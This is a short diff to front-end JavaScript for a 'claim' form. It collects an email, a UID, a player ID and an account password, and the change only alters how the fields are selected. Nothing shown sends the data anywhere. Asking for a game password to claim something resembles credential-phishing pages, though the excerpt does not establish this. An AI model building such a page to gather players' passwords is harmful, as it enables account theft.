@@ -24,9 +24,9 @@ document.querySelector('#claimForm').addEventListener('submit', async e => {
   const form = e.target;
 
   const email = form.querySelector('input[type="email"]')?.value.trim();
-  const uid = form.querySelector('[name="uid"]')?.value.trim();
-  const playerId = form.querySelector('[name="player_id"]')?.value.trim();
-  const password = form.querySelector('input[type="password"]')?.value.trim()
+  const uid = form.querySelector('#uid')?.value.trim();
+  const playerId = form.querySelector('#player')?.value.trim();
+  const password = form.querySelector('#password')?.value.trim()
   if (!email || !uid || !playerId || !password) {
     result.hidden = false;
     result.textContent = 'Please complete all required fields.';
